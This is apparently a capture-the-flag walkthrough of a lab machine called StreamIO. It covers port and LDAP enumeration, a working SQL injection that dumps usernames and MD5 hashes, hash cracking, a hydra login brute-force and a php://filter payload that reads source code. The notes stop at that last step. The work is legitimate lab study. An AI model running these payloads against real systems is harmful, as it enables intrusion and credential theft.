```
sudo nmap -sS -sV -p- 10.10.11.158
[sudo] password for wizardwalter: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 22:43 EDT
Stats: 0:03:04 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 22:46 (0:00:11 remaining)
Nmap scan report for 10.10.11.158
Host is up (0.030s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-29 09:45:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49728/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

ldap search:
```
ldapsearch -x -H ldap://10.10.11.158 -s base -LLL
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=streamIO,DC=htb
ldapServiceName: streamIO.htb:dc$@STREAMIO.HTB
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=streamIO,DC=htb
serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configurat
 ion,DC=streamIO,DC=htb
schemaNamingContext: CN=Schema,CN=Configuration,DC=streamIO,DC=htb
namingContexts: DC=streamIO,DC=htb
namingContexts: CN=Configuration,DC=streamIO,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=streamIO,DC=htb
namingContexts: DC=DomainDnsZones,DC=streamIO,DC=htb
namingContexts: DC=ForestDnsZones,DC=streamIO,DC=htb
isSynchronized: TRUE
highestCommittedUSN: 143654
dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=streamIO,DC=htb
dnsHostName: DC.streamIO.htb
defaultNamingContext: DC=streamIO,DC=htb
currentTime: 20250829095711.0Z
configurationNamingContext: CN=Configuration,DC=streamIO,DC=htb
```

i added `streamio.htb` to etc/hosts

i tried smb:
```
mbclient -L //10.10.11.158 -N

session setup failed: NT_STATUS_ACCESS_DENIED
```

now to get cert from port 443:
```
openssl s_client -connect 10.10.11.158:443 -showcerts

Connecting to 10.10.11.158
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C=EU, CN=streamIO
verify error:num=18:self-signed certificate
verify return:1
depth=0 C=EU, CN=streamIO
verify error:num=10:certificate has expired
notAfter=Mar 24 07:03:28 2022 GMT
verify return:1
depth=0 C=EU, CN=streamIO
notAfter=Mar 24 07:03:28 2022 GMT
verify return:1
---
Certificate chain
 0 s:C=EU, CN=streamIO
   i:C=EU, CN=streamIO
   a:PKEY: RSA, 2048 (bit); sigalg: sha256WithRSAEncryption
   v:NotBefore: Feb 22 07:03:28 2022 GMT; NotAfter: Mar 24 07:03:28 2022 GMT
-----BEGIN CERTIFICATE-----
MIIDYjCCAkqgAwIBAgIUbdDRZxR55nbfMxJzBHWVXcH83kQwDQYJKoZIhvcNAQEL
BQAwIDELMAkGA1UEBhMCRVUxETAPBgNVBAMMCHN0cmVhbUlPMB4XDTIyMDIyMjA3
MDMyOFoXDTIyMDMyNDA3MDMyOFowIDELMAkGA1UEBhMCRVUxETAPBgNVBAMMCHN0
cmVhbUlPMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2QSO8noWDU+A
MYuhSMrB2mA+V7W2gwMdTHxYK0ausnBHdfQ4yGgAs7SdyYKXf8fA502x4LvYwgmd
67QtQdYtsTSv63SlnEW3zjJyu/dRW0cwMfBCqyiLgAScrxb/6HOhpnOAzk0DdBWE
2vobsSSAh+cDHVSuSbEBLqJ0GEL4hcggHhQq6HLRmmrb0wGjL1WIwjQ8cCWcFzzw
5Xe3gEe+aHK245qZKrZtHuXelFe72/nbF8VFiukkaBMgoh6VfpM66nMzy+KeLfhP
FkxBt6osGUHwSnocJknc7t+ySRVTACAMPjbbPGEl4hvNEcZpepep6jD6qgi4k7bL
82Nu2AeSIQIDAQABo4GTMIGQMB0GA1UdDgQWBBRf0ALWCgvVfRgijR2I0KY0uRjY
djAfBgNVHSMEGDAWgBRf0ALWCgvVfRgijR2I0KY0uRjYdjAPBgNVHRMBAf8EBTAD
AQH/MCsGA1UdEQQkMCKCDHN0cmVhbUlPLmh0YoISd2F0Y2guc3RyZWFtSU8uaHRi
MBAGA1UdIAQJMAcwBQYDKgMEMA0GCSqGSIb3DQEBCwUAA4IBAQCCAFvDk/XXswL4
cP6nH8MEkdEU7yvMOIPp+6kpgujJsb/Pj66v37w4f3us53dcoixgunFfRO/qAjtY
PNWjebXttLHER+fet53Mu/U8bVQO5QD6ErSYUrzW/l3PNUFHIewpNg09gmkY4gXt
oZzGN7kvjuKHm+lG0MunVzcJzJ3WcLHQUcwEWAdSGeAyKTfGNy882YTUiAC3p7HT
61PwCI+lO/OU52VlgnItRHH+yexBTLRB+Oa2UhB7GnntQOR1S5g497Cs3yAciST2
JaKhcCnBY1cWqUSAm56QK3mz55BNPcOUHLhrFLjIaWRVx8Ro8QOCWcxkTfVcKcR+
DSJTOJH8
-----END CERTIFICATE-----
---
Server certificate
subject=C=EU, CN=streamIO
issuer=C=EU, CN=streamIO
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: rsa_pkcs1_sha256
Peer Temp Key: ECDH, secp384r1, 384 bits
---
SSL handshake has read 1390 bytes and written 1818 bytes
Verification error: certificate has expired
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Protocol: TLSv1.2
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID: 8137000072DE42A00BAE6B113E527DD6592EC7526193649B4CDC634EA05E7872
    Session-ID-ctx: 
    Master-Key: 32D6416E72FD443A3B56115FF7A98E28093479AE3D02B92FA045E6DFB98C534435609C54BE28AF6EEE2EFF877FCE645C
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    Start Time: 1756438242
    Timeout   : 7200 (sec)
    Verify return code: 10 (certificate has expired)
    Extended master secret: yes
---

```

then run this since we got the cert for port 443:
```
 echo | openssl s_client -connect 10.10.11.158:443 2>/dev/null | openssl x509 -noout -text
```
Output:
```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            6d:d0:d1:67:14:79:e6:76:df:33:12:73:04:75:95:5d:c1:fc:de:44
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=EU, CN=streamIO
        Validity
            Not Before: Feb 22 07:03:28 2022 GMT
            Not After : Mar 24 07:03:28 2022 GMT
        Subject: C=EU, CN=streamIO
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:d9:04:8e:f2:7a:16:0d:4f:80:31:8b:a1:48:ca:
                    c1:da:60:3e:57:b5:b6:83:03:1d:4c:7c:58:2b:46:
                    ae:b2:70:47:75:f4:38:c8:68:00:b3:b4:9d:c9:82:
                    97:7f:c7:c0:e7:4d:b1:e0:bb:d8:c2:09:9d:eb:b4:
                    2d:41:d6:2d:b1:34:af:eb:74:a5:9c:45:b7:ce:32:
                    72:bb:f7:51:5b:47:30:31:f0:42:ab:28:8b:80:04:
                    9c:af:16:ff:e8:73:a1:a6:73:80:ce:4d:03:74:15:
                    84:da:fa:1b:b1:24:80:87:e7:03:1d:54:ae:49:b1:
                    01:2e:a2:74:18:42:f8:85:c8:20:1e:14:2a:e8:72:
                    d1:9a:6a:db:d3:01:a3:2f:55:88:c2:34:3c:70:25:
                    9c:17:3c:f0:e5:77:b7:80:47:be:68:72:b6:e3:9a:
                    99:2a:b6:6d:1e:e5:de:94:57:bb:db:f9:db:17:c5:
                    45:8a:e9:24:68:13:20:a2:1e:95:7e:93:3a:ea:73:
                    33:cb:e2:9e:2d:f8:4f:16:4c:41:b7:aa:2c:19:41:
                    f0:4a:7a:1c:26:49:dc:ee:df:b2:49:15:53:00:20:
                    0c:3e:36:db:3c:61:25:e2:1b:cd:11:c6:69:7a:97:
                    a9:ea:30:fa:aa:08:b8:93:b6:cb:f3:63:6e:d8:07:
                    92:21
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                5F:D0:02:D6:0A:0B:D5:7D:18:22:8D:1D:88:D0:A6:34:B9:18:D8:76
            X509v3 Authority Key Identifier: 
                5F:D0:02:D6:0A:0B:D5:7D:18:22:8D:1D:88:D0:A6:34:B9:18:D8:76
            X509v3 Basic Constraints: critical
                CA:TRUE
            X509v3 Subject Alternative Name: 
                DNS:streamIO.htb, DNS:watch.streamIO.htb
            X509v3 Certificate Policies: 
                Policy: 1.2.3.4
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        82:00:5b:c3:93:f5:d7:b3:02:f8:70:fe:a7:1f:c3:04:91:d1:
        14:ef:2b:cc:38:83:e9:fb:a9:29:82:e8:c9:b1:bf:cf:8f:ae:
        af:df:bc:38:7f:7b:ac:e7:77:5c:a2:2c:60:ba:71:5f:44:ef:
        ea:02:3b:58:3c:d5:a3:79:b5:ed:b4:b1:c4:47:e7:de:b7:9d:
        cc:bb:f5:3c:6d:54:0e:e5:00:fa:12:b4:98:52:bc:d6:fe:5d:
        cf:35:41:47:21:ec:29:36:0d:3d:82:69:18:e2:05:ed:a1:9c:
        c6:37:b9:2f:8e:e2:87:9b:e9:46:d0:cb:a7:57:37:09:cc:9d:
        d6:70:b1:d0:51:cc:04:58:07:52:19:e0:32:29:37:c6:37:2f:
        3c:d9:84:d4:88:00:b7:a7:b1:d3:eb:53:f0:08:8f:a5:3b:f3:
        94:e7:65:65:82:72:2d:44:71:fe:c9:ec:41:4c:b4:41:f8:e6:
        b6:52:10:7b:1a:79:ed:40:e4:75:4b:98:38:f7:b0:ac:df:20:
        1c:89:24:f6:25:a2:a1:70:29:c1:63:57:16:a9:44:80:9b:9e:
        90:2b:79:b3:e7:90:4d:3d:c3:94:1c:b8:6b:14:b8:c8:69:64:
        55:c7:c4:68:f1:03:82:59:cc:64:4d:f5:5c:29:c4:7e:0d:22:
        53:38:91:fc
```
we can see DNS:
```
DNS:streamIO.htb, DNS:watch.streamIO.htb
```

could also run:
```
wfuzz -u https://streamio.htb -H "Host: FUZZ.streamio.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 315

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://streamio.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================

000002268:   200        78 L     245 W      2829 Ch     "watch"        
```
on `https://streamio.htb/`
![[Pasted image 20250828232526.png]]

at /about.php i found:
![[Pasted image 20250828232646.png]]

with:
```
Barry
Oliver
Samantha
```

surely they are users or atleast one of them is(prob oliver)

on https://watch.streamio.htb:
![[Pasted image 20250829000836.png]]

im gonna run gobuster but have to remember to use the -k flag to skip tls validation:
```
gobuster dir -k -u https://watch.streamio.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x php

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://watch.streamio.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Index.php            (Status: 200) [Size: 2829]
/Search.php           (Status: 200) [Size: 253887]
/blocked.php          (Status: 200) [Size: 677]
/favicon.ico          (Status: 200) [Size: 1150]
/index.php            (Status: 200) [Size: 2829]
/index.php            (Status: 200) [Size: 2829]
/search.php           (Status: 200) [Size: 253887]
/static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/static/]
Progress: 9488 / 9490 (99.98%)
===============================================================
Finished
===============================================================
```

then also gotta:
```
gobuster dir -k -u https://streamio.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 50 -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 151] [--> https://streamio.htb/images/]
/about.php            (Status: 200) [Size: 7825]
/index.php            (Status: 200) [Size: 13497]
/contact.php          (Status: 200) [Size: 6434]
/register.php         (Status: 200) [Size: 4500]
/login.php            (Status: 200) [Size: 4145]
/Images               (Status: 301) [Size: 151] [--> https://streamio.htb/Images/]
/admin                (Status: 301) [Size: 150] [--> https://streamio.htb/admin/]
/css                  (Status: 301) [Size: 148] [--> https://streamio.htb/css/]
/Contact.php          (Status: 200) [Size: 6434]
/About.php            (Status: 200) [Size: 7825]
/Index.php            (Status: 200) [Size: 13497]
/Login.php            (Status: 200) [Size: 4145]
/js                   (Status: 301) [Size: 147] [--> https://streamio.htb/js/]
/logout.php           (Status: 302) [Size: 0] [--> https://streamio.htb/]
/Register.php         (Status: 200) [Size: 4500]
/fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/fonts/]
/IMAGES               (Status: 301) [Size: 151] [--> https://streamio.htb/IMAGES/]
/INDEX.php            (Status: 200) [Size: 13497]
/Fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/Fonts/]
```


![[Pasted image 20250830140112.png]]

also there is a login page:
![[Pasted image 20250830155658.png]]

from there we see a register page but if i register and try to login, doesnt work:
![[Pasted image 20250830155636.png]]
doesnt look like much here lets go back to watch.streamio.htb....

after going through the above lets look back at watch.streamio i am interested in /admin:
```
gobuster dir -k -u https://streamio.htb/admin/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 50 -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb/admin/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 403) [Size: 18]
/images               (Status: 301) [Size: 157] [--> https://streamio.htb/admin/images/]
/Images               (Status: 301) [Size: 157] [--> https://streamio.htb/admin/Images/]
/css                  (Status: 301) [Size: 154] [--> https://streamio.htb/admin/css/]
/Index.php            (Status: 403) [Size: 18]
/js                   (Status: 301) [Size: 153] [--> https://streamio.htb/admin/js/]
/master.php           (Status: 200) [Size: 58]
/fonts                (Status: 301) [Size: 156] [--> https://streamio.htb/admin/fonts/]
```

search.php looks promising:

 it is a search form for movies.... i tested for sql injection and found this:
 ![[Pasted image 20250830145432.png]]
statement `test' UNION SELECT 1,2,3,4,5,6; -- -`

returned 2

`test' union select 1,(select DB_NAME()),3,4,5,6;-- -`

returns dbname:
`StreamIo`

`test' union select 1,name,3,4,5,6 from master..sysdatabases;-- -`

returns table names:
```
master
model
msdb
STREAMIO
streamio_backup
termpdb
```

![[Pasted image 20250830145857.png]]

`test' UNION SELECT 1,name,id,4,5,6 from streamio..sysobjects where xtype LIKE 'U'; -- -`

returns
```
movies     885578193
users      901578250
```

lets def dump users :D

`test' UNION SELECT 1,username,3,4,5,6 from users; -- -`
```
##### admin
##### Alexendra
##### Austin
##### Barbra
##### Barry
##### Baxter
##### Bruno
##### Carmon
##### Clara
##### Diablo
##### Garfield
##### Gloria
##### James
##### Juliette
##### Lauren
##### Lenord
##### Lucifer
##### Michelle
##### Oliver
##### Robert
#### Robin
##### Sabrina
##### Samantha
##### Stan
##### Thane
##### Theodore
##### Victor
##### Victoria
##### William
##### yoshihide
```

and well do the same for password:
```
##### 0049ac57646627b8d7aeaccf8b6a936f
##### 08344b85b329d7efd611b7a7743e8a09
##### 083ffae904143c4796e464dac33c1f7d
##### 0cfaaaafb559f081df2befbe66686de0
##### 1c2b3d8270321140e5153f6637d3ee53
##### 22ee218331afd081b0dcd8115284bae3
##### 2a4e2cf22dd8fcb45adcb91be1e22ae8
##### 35394484d89fcfdb3c5e447fe749d213
##### 3577c47eb1e12c8ba021611e1280753c
##### 384463526d288edcc95fc3701e523bc7
##### 3961548825e3e21df5646cafe11c6c76
##### 54c88b2dbd7b1a84012fabc1a4c73415
##### 665a50ac9eaa781e4f7f04199db97a11
##### 6dcd87740abb64edfa36d170f0d5450d
##### 7df45a9e3de3863807c026ba48e55fb3
##### 8097cedd612cc37c29db152b6e9edbd3
##### 925e5408ecb67aea449373d668b7359e
##### b22abb47a02b52d5dfa27fb0b534f693
##### b779ba15cedfd22a023c4d8bcf5f2332
##### b83439b16f844bd6ffe35c02fe21b3c0
##### bf55e15b119860a6e6b5a164377da719
##### c660060492d9edcaa8332d89c99c9239
##### d62be0dc82071bccc1322d64ec5b6c51
##### dc332fb5576e9631c9dae83f194f8e70
##### ec33265e5fc8c2f1b0c137bb7b3632b5
##### ee0b8a0937abd60c2882eacb2f8dc49f
##### ef8f3d30a856cf166fb8215aca93e9ff
##### f03b910e2bd0313a23fdd7575f34a694
##### f87d3c0d6c8fd686aacc6627f1f493a5
##### fd78db29173a5cf701bd69027cb9bf6b
```

Now we combine:
hashes.txt:
```
admin:0049ac57646627b8d7aeaccf8b6a936f
Alexendra:08344b85b329d7efd611b7a7743e8a09
Austin:083ffae904143c4796e464dac33c1f7d
Barbra:0cfaaaafb559f081df2befbe66686de0
Barry:1c2b3d8270321140e5153f6637d3ee53
Baxter:22ee218331afd081b0dcd8115284bae3
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8
Carmon:35394484d89fcfdb3c5e447fe749d213
Clara:3577c47eb1e12c8ba021611e1280753c
Diablo:384463526d288edcc95fc3701e523bc7
Garfield:3961548825e3e21df5646cafe11c6c76
Gloria:54c88b2dbd7b1a84012fabc1a4c73415
James:665a50ac9eaa781e4f7f04199db97a11
Juliette:6dcd87740abb64edfa36d170f0d5450d
Lauren:7df45a9e3de3863807c026ba48e55fb3
Lenord:8097cedd612cc37c29db152b6e9edbd3
Lucifer:925e5408ecb67aea449373d668b7359e
Michelle:b22abb47a02b52d5dfa27fb0b534f693
Oliver:b779ba15cedfd22a023c4d8bcf5f2332
Robert:b83439b16f844bd6ffe35c02fe21b3c0
Robin:bf55e15b119860a6e6b5a164377da719
Sabrina:c660060492d9edcaa8332d89c99c9239
Samantha:d62be0dc82071bccc1322d64ec5b6c51
Stan:dc332fb5576e9631c9dae83f194f8e70
Thane:ec33265e5fc8c2f1b0c137bb7b3632b5
Theodore:ee0b8a0937abd60c2882eacb2f8dc49f
Victor:ef8f3d30a856cf166fb8215aca93e9ff
Victoria:f03b910e2bd0313a23fdd7575f34a694
William:f87d3c0d6c8fd686aacc6627f1f493a5
yoshihide:fd78db29173a5cf701bd69027cb9bf6b
```

COOL!

Now we gotta crack these somehow:
ill take the admins hash and drop it to name-that-hash
```
nth --text 0049ac57646627b8d7aeaccf8b6a936f
....

0049ac57646627b8d7aeaccf8b6a936f

Most Likely 
MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
MD4, HC: 900 JtR: raw-md4
NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
Domain Cached Credentials, HC: 1100 JtR: mscach
```

lets try these and see(tho again they are 32 char hashes, most likely md5):
```
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 30 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=5
Press 'q' or Ctrl-C to abort, almost any other key for status
highschoolmusical (Clara)     
physics69i       (Theodore)     
paddpadd         (James)     
66boysandgirls.. (Oliver)     
%$clara          (Victor)     
$monique$1991$   (Bruno)     
$hadoW           (Gloria)     
$3xybitch        (Juliette)     
##123a8j8w5123## (Alexendra)     
!?Love?!123      (Robert)     
!5psycho8!       (Michelle)     
!!sabrina$       (William) 
```

OR

use the --user flag to make sure hashcat knows that there is a username in there before ease hash:
```
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --user

hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 7 5700G with Radeon Graphics, 6943/13951 MB (2048 MB allocatable), 5MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 30 digests; 30 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

3577c47eb1e12c8ba021611e1280753c:highschoolmusical        
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i               
665a50ac9eaa781e4f7f04199db97a11:paddpadd                 
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..         
ef8f3d30a856cf166fb8215aca93e9ff:%$clara                  
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$           
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW                   
6dcd87740abb64edfa36d170f0d5450d:$3xybitch                
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##         
Approaching final keyspace - workload adjusted.           

b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123              
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!               
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```


lets make a user and pass file:
```
admin
Alexendra
Austin
Barbra
Barry
Baxter
Bruno
Carmon
Clara
Diablo
Garfield
Gloria
James
Juliette
Lauren
Lenord
Lucifer
Michelle
Oliver
Robert
Robin
Sabrina
Samantha
Stan
Thane
Theodore
Victor
Victoria
William
yoshihide
```

```
highschoolmusical
physics69i
paddpadd
66boysandgirls..
%$clara
$monique$1991$
$hadoW
$3xybitch
##123a8j8w5123##
!?Love?!123
!5psycho8!
!!sabrina$
```
lets try signing in on the login page we found before:
```
hydra -L users.txt -P passwords.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Failed" -s 443 -V
```
- `-t 1` → only 1 thread (default is 16).
    
- `-W 5` → wait 5 seconds between attempts per thread.
    
- `-V` → verbose, so you see each request.
    
- If it’s HTTPS, don’t forget `-s 443`.

finally after an hour of this running:
`yoshihide:66boysandgirls..`

then i log in and it go to /admin where i see a bunch of actions to perform.... then i look for other hidden ones and find:
```
ffuf -u https://streamio.htb/admin/?FUZZ=value \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -H "Cookie: PHPSESSID=gamf40dud9ktrlhg4n079pkfk1"
```

PS... i got that cookie out of the storage tab in dev tools in browser. 

which i found all the ones already there and then another one called debug!

after messing around and looking at php filters i found a way to get the master.php file by:
`https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php`

which spit out:
```
